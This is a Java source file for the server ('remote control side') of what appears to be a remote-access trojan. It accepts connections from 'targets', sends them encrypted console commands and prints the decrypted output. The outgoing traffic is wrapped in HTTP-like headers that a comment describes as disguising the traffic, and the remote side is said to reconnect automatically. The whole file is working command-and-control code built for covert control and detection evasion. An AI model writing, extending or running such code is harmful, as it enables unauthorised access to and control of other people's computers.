package socks;

import constant.CheckCommands;
import encryption.AESOperator;
import property.Property;

import java.io.*;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;

/**
 * 远程控制端
 */
public class Server {

    public static void run() {
        ServerSocket server;
        //由系统标准输入设备构造BufferedReader对象
        BufferedReader sin = new BufferedReader(new InputStreamReader(System.in));

        try {
            //设置侦听端口
            server = new ServerSocket(Property.port, 20, InetAddress.getByName(Property.addr));
            System.out.println("启动成功！\r\n等待目标连接。");
            String clientAddr = null;

            while (true) {
                try {
                    //初始化连接类型
                    String type = "cmd";

                    //等待连接
                    Socket socket = server.accept();

                    //获取一些连接信息
                    String tmpAddr = socket.getRemoteSocketAddress().toString().split(":")[0].substring(1);
                    String tmpPort = socket.getRemoteSocketAddress().toString().split(":")[1];

                    if (clientAddr == null || !clientAddr.equals(tmpAddr)) {
                        clientAddr = tmpAddr;
                        System.out.println("目标地址：" + clientAddr);
                        type = "\\getInitInfo"; //获取一些连接信息
                        System.out.println("输入：\\help查看帮助信息");
                    }

                    //由Socket对象得到输入流
                    BufferedReader is = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    //由Socket对象得到输出流
                    BufferedWriter os = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));

                    String input = "";


                    if (type.equals("\\getInitInfo")) {
                        //获取一些连接信息
                    } else {
                        CheckCommands checkCommands = new CheckCommands(sin, type, input);
                        if (checkCommands.getBreaks().equals("break")) {
                            break;
                        }
                        type = checkCommands.getType();
                        input = checkCommands.getInput();
                    }

                    //数据加密
                    String data = type.concat("#!#:#!#").concat(input);
                    try {
                        data = AESOperator.getInstance().encrypt(data);
                    } catch (Exception e) {
                        System.err.println("加密过程导致异常！");
                    }

                    //伪装流量
                    BufferedReader in = new BufferedReader(new InputStreamReader(Property.class.getResourceAsStream("/conf/boxResponse.context")));
                    String requestHeaders = "";
                    String tmpStr;
                    while ((tmpStr = in.readLine()) != null) {
                        // System.out.println(tmpStr);
                        requestHeaders += tmpStr + "\r\n";
                    }
                    in.close();

                    data = requestHeaders.concat("\r\n").concat(data);

                    //向目标发送指令
                    os.write(data);
                    os.newLine();
                    os.flush();

                    //接收到的客户端数据
                    String result = "";
                    String line;
                    while ((line = is.readLine()) != null) {
                        result += line.concat("\r\n");
                    }
                    result = result.substring(result.lastIndexOf("rctrl_data_0303201=") + 19);

                    //数据解密
                    try {
                        result = AESOperator.getInstance().decrypt(result);
                    } catch (Exception e) {
                        System.err.println("解密过程异常！");
                    }
                    if (result.startsWith("_error_:")) {
                        System.err.println(result);
                    } else {
                        System.out.println(result);
                    }

                    os.close();
                    is.close();
                    socket.close();
                } catch (IOException e) {
                    e.printStackTrace();
                    System.err.println("IO异常了！可能此次连接对方已经丢失！对方有重连机制，可以重新尝试。\r\n或者重启服务端。");
                }
            }
            server.close();
        } catch (IOException e) {
            //e.printStackTrace();
            System.err.println("创建服务失败！请确保端口等配置信息正确！");
        }
    }

}
